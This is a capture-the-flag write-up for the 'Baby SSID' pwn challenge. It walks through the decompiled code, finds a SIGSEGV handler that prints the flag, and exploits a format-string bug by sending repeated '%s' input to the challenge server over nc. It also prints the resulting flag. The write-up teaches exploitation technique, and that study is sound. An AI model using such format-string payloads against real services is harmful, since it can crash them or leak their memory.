# **FOO BAR CTF - PWN**

## **Baby SSID**

### Description
> What are these signals we are recieving ?

We were given a binary file

### Solution
Let's run the binary file
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ ./ssid 
zsh: segmentation fault  ./ssid
```
Hmm. Let's check the decompiled binary output:
```c
void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 in_stack_00000000;
  undefined auStack8 [8];
  
  __libc_start_main(FUN_00101160,in_stack_00000000,&stack0x00000008,FUN_00101320,FUN_00101390,
                    param_3,auStack8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```
```c
undefined8 FUN_00101160(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char acStack56 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  DAT_00104020 = (char *)malloc(100);
  __stream = fopen("./flag.txt","r");
  fgets(DAT_00104020,100,__stream);
  fclose(__stream);
  signal(0xb,FUN_00101300);
  fgets(acStack56,0x20,stdin);
  __printf_chk(1,acStack56);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

```c
void FUN_00101300(void)

{
  puts(DAT_00104020);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
It seems like we run into segmentation fault because there does not exist flag.txt file  
Let's try again with flag.txt created

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ touch flag.txt
                                                                            
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ ./ssid        
test
test
```
Looks like the program echo back we input
Another thing to note that the flag.txt file content was stored at ``` DAT_00104020 ```and in the function ``` FUN_00101300 ``` we print out its content  
Now we want to trigger that function, but how? If we look into the function signal we would find what it's doing is basically using ``` FUN_00101300 ``` to signal-handle a signum : ``` 0xb ``` or the signum for ``` SIGSEV ```    
Now all we have to do is trigger ``` SIGSEV ``` and ``` FUN_00101300 ``` will give us flag  

```c
  __printf_chk(1,acStack56);
```
It's a tell-tale sign of a format string vulnerability, we just need to input a bunch of "%s"  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ nc chall.nitdgplug.org 30092
%s %s %s %s %s %s %s %s %s %s
(null)  %s %s %s %s %s %s %s %s %s %s
 GLUG{https://bit.ly/3vPXAuD}
```

The flag is : ``` GLUG{https://bit.ly/3vPXAuD} ```



